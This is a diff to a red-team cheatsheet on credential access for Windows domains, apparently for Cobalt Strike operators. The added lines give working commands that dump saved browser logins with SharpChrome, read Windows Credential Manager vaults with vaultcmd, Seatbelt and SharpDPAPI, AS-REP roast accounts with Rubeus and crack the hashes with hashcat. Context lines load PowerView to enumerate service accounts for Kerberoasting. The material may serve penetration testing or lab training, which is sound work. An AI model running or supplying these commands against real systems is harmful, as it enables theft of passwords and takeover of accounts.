@@ -1,10 +1,30 @@
-# Cheatsheet: Credential access
+# Credential access  
 
----
+* Credentials from Web Browsers
+```
+execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
+```
+
+* Windows Credential Manager   
+```
+run vaultcmd /listcreds:"Windows Credentials" /all
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
+execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
+```
 
 ## Kerberoasting
 
 > Request TGS tickets for accounts with SPNs set, crack offline. No LSASS touch, no admin required.
+
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
+```
+
+>Hashcat mode 18200  
+
+```
+.\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
+```
 
 ### Prerequisites
 
@@ -63,14 +83,6 @@ beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
 
 // Step 2 — all subsequent powerpick calls have PowerView loaded
 beacon> powerpick Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
-```
-
-**Why inline Import-Module fails:**
-
-```cs
-// BROKEN — powerpick spawns a fresh runspace each call
-// Import-Module in one call does NOT persist to the next powerpick
-beacon> powerpick Import-Module C:\Tools\PowerSploit\Recon\PowerView.ps1; Get-DomainUser -SPN
 ```
 
 **Troubleshooting `powershell-import` "not found" error:**
